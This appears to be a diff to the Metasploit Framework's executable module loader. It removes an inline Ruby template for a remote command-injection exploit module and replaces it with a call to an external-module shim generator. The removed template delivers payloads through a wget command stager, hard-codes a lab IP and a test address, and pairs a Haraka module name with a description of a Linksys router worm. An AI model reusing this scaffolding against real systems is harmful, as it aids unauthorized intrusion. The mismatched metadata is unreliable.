@@ -2,6 +2,7 @@
 
 require 'msf/core/modules/loader'
 require 'msf/core/modules/loader/base'
+require 'msf/core/modules/external/shim'
 
 # Concerns loading executables from a directory as modules
 class Msf::Modules::Loader::Executable < Msf::Modules::Loader::Base
@@ -81,80 +82,6 @@ class Msf::Modules::Loader::Executable < Msf::Modules::Loader::Base
       load_error(full_path, Errno::ENOENT.new)
       return ''
     end
-    %Q|
-require 'msf/core'
-
-class MetasploitModule < Msf::Exploit::Remote
-  Rank = ExcellentRanking
-
-  include Msf::Exploit::CmdStager
-
-  def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Haraka Remote Command Injection',
-      'Description' => %q{
-        Some Linksys E-Series Routers are vulnerable to an unauthenticated OS command
-        injection. This vulnerability was used from the so-called "TheMoon" worm. There
-        are many Linksys systems that are potentially vulnerable, including E4200, E3200, E3000,
-        E2500, E2100L, E2000, E1550, E1500, E1200, E1000, and E900. This module was tested
-        successfully against an E1500 v1.0.5.
-      },
-      'Author'      =>
-        [
-          'Johannes Ullrich', #worm discovery
-          'Rew', # original exploit
-          'infodox', # another exploit
-          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module
-          'juan vazquez' # minor help with msf module
-        ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'EDB', '31683' ],
-          [ 'BID', '65585' ],
-          [ 'OSVDB', '103321' ],
-          [ 'PACKETSTORM', '125253' ],
-          [ 'PACKETSTORM', '125252' ],
-          [ 'URL', 'https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633' ],
-          [ 'URL', 'https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630' ]
-        ],
-      'DisclosureDate' => 'Feb 13 2014',
-      'Privileged'     => true,
-      'Platform'       => %w{ linux unix },
-      'Payload'        =>
-        {
-          'DisableNops' => true
-        },
-      'Targets'        =>
-        [
-          [ 'Linux x64 Payload',
-            {
-            'Arch' => ARCH_X64,
-            'Platform' => 'linux'
-            }
-          ]
-        ],
-      'DefaultTarget'   => 0,
-      'DefaultOptions' => { 'WfsDelay' => 5 }
-      ))
-  end
-
-  def execute_command(cmd, opts)
-    to = 'admin@arnold'
-    rhost = '192.168.244.130'
-    `#{module_path(parent_path, type, module_reference_name)} -c "\#{cmd}" -t \#{to} -m \#{rhost}`
-    true
-  end
-
-  def exploit
-    print_status("Trying to access the vulnerable URL...")
-
-    print_status("Exploiting...")
-    execute_cmdstager({:flavor  => :wget})
-  end
-
-
-end
-    |
+    Msf::Modules::External::Shim.generate(full_path)
   end
 end
